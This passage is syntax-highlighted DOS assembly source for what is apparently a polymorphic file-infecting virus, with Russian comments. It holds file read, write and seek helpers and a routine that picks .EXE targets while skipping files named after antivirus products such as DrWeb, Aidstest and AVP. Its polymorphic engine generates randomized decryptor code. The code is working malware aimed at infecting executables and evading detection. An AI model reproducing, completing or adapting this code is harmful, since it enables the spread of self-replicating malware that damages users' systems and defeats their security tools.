        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">SeekStart</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">42h</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Read</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Write</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc0">
        </span><span class="sc6">int</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Read4b</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Temp</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Read</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Into512</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">512</span><span class="sc0">
        </span><span class="sc6">div</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">CmpStr</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
</span><span class="sc5">Loop08</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop08</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">












</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;                   ПРОВЕРКА ДОПУСТИМОСТИ ИМЕНИ ФАЙЛА</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">TestFile</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">;[Устанавливаем SI на начало, а DI - на конец имени файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">Loop09</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">L7</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
</span><span class="sc5">L7</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">Loop09</span><span class="sc0">


</span><span class="sc1">;[Проверяем расширение файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">5</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'E.'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">Error</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'EX'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">Error</span><span class="sc0">


</span><span class="sc1">;[Проверяем имя файла]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">AntiVir</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFDFh</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CmpStr</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">  </span><span class="sc10">Error</span><span class="sc0">
</span><span class="sc9">IF</span><span class="sc0"> </span><span class="sc5">DEBUG</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'ZZ'</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc10">Error</span><span class="sc0">
</span><span class="sc9">ENDIF</span><span class="sc0">
        </span><span class="sc6">clc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc10">Error</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc6">stc</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">AntiVir</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc12">'DRADAVTB'</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">













</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">
</span><span class="sc1">;               ПОЛИМОРФИК</span><span class="sc0">
</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">Store</span><span class="sc0">       </span><span class="sc9">MACRO</span><span class="sc0">   </span><span class="sc5">d1</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">d4</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">d1</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">d2</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">d3</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc5">d4</span><span class="sc0">
        </span><span class="sc9">ENDM</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

</span><span class="sc5">PoliGen</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">083h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0B9h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenA</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E981h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">CodeSize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">802Eh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Key3</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenA</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">GenA</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc2">0E2h</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════</span><span class="sc0">

        </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ifBP</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ifSI</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">ifDI</span><span class="sc0">

</span><span class="sc5">ifBX</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">store</span><span class="sc0">   </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B7h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Bh</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ifBP</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">store</span><span class="sc0">   </span><span class="sc2">045h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EDh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Dh</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ifSI</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">store</span><span class="sc0">   </span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B4h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Eh</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">ifDI</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc5">store</span><span class="sc0">   </span><span class="sc2">047h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B5h</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EFh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">05Fh</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">;══════════════════════════════════════════════════════════════════════════════     </span><span class="sc0">

</span><span class="sc5">GenA</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
</span><span class="sc5">Loop10</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Gen1</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">Gen2</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">Loop10</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">     


</span><span class="sc5">Gen1</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1111b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Opcodes</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc0">
        </span><span class="sc6">xlat</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">Buffer</span><span class="sc4">-</span><span class="sc5">Virus</span><span class="sc4">+</span><span class="sc8">si</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">Gen2</span><span class="sc4">:</span><span class="sc0">       </span><span class="sc6">in</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00111011b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11000000b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">AllRegs</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11111110b</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">bh</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">

</span><span class="sc5">AllRegs</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000010b</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">  </span><span class="sc5">Regs2</span><span class="sc0">
